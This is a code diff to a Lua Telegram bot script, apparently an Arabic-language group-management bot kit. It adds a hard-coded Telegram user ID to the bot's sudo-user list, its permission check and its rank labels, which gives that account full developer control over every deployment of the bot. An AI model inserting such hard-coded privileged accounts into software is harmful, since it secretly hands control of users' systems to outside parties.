@@ -173,7 +173,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1264922434,1355955429}   
+sudo_users = {SUDO,1264922434,1355955429,1033028167}   
 function SudoBot(msg)  
 local BOYKA = false  
 for k,v in pairs(sudo_users) do  
@@ -235,6 +235,8 @@ function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(1264922434) then  
 var = true  
 elseif tonumber(user_id) == tonumber(1355955429) then
+var = true 
+elseif tonumber(user_id) == tonumber(1033028167) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -264,6 +266,8 @@ if tonumber(user_id) == tonumber(1264922434) then
 var = 'مطور السورس'
 elseif tonumber(user_id) == tonumber(1355955429) then
 var = 'مبرمج بويكا'
+elseif tonumber(user_id) == tonumber(1033028167) then
+var = 'Developer'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif tonumber(user_id) == tonumber(bot_id) then  
